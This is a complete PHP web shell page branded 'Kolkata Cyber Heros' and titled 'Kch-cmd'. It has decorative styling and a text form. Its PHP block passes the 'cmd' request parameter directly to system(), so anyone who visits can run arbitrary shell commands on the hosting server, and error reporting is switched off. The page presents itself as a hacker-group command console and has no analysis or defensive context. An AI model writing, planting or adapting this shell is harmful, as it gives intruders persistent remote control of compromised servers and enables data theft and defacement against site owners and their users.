
<!DOCTYPE html>
<html>
<head>
	<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<?php error_reporting(0);?>
	<title>Kch-cmd</title>
	<style> 
        body{
        	 background:url("https://i.pinimg.com/originals/87/1b/96/871b96ab341c69b000cf7eed78c59002.png") no-repeat fixed center;
        	 
        	 background-size: 100%;
        	 
        }

  .myButton {
	box-shadow:inset 0px 1px 0px 0px #f29c93;
	background:linear-gradient(to bottom, #fe1a00 5%, #ce0100 100%);
	background-color:#fe1a00;
	border-radius:6px;
	border:1px solid #d83526;
	display:inline-block;
	cursor:pointer;
	color:#ffffff;
	font-family:Arial;
	font-size:15px;
	font-weight:bold;
	padding:6px 24px;
	text-decoration:none;
	text-shadow:0px 1px 0px #b23e35;
}
.myButton:hover {
	background:linear-gradient(to bottom, #ce0100 5%, #fe1a00 100%);
	background-color:#ce0100;
}
.myButton:active {
	position:relative;
	top:1px;
}
.ls {
  background-color:    #060100   ;
  width: 900px;
  border-radius: 15px 15px 15px 15px;

  border: 4px solid   #ca2909  ;
  padding: 150px;
  margin: auto;

  color:#04fa26;
  font-family: cursive; 
}
	</style>
</head>
<body ><br>
<center><img src="https://i.ibb.co/h2LGCrh/kch.png" height="200" width="200"> </center>
<center><h1 style="font-family: 'Metal Mania', cursive; "><font color="red">KOLKATA</font><font color="white"> CYBER</font><font color="red"> HEROS</font> </h1></center>	
<center>
	<center><h1 style="color:#04fa26 ">Execute_Cmd !!</h1></center>

<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT class="myButton" style="background: black; color: #04fa26;font-family: cursive; width: 30%" TYPE="text" NAME="cmd">
<INPUT class="myButton" TYPE="submit" VALUE="Send"></center>
<form><br>




 <div class="ls"><pre>
<?
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre></div> 
 
</form>

</FORM>
</body>
</html>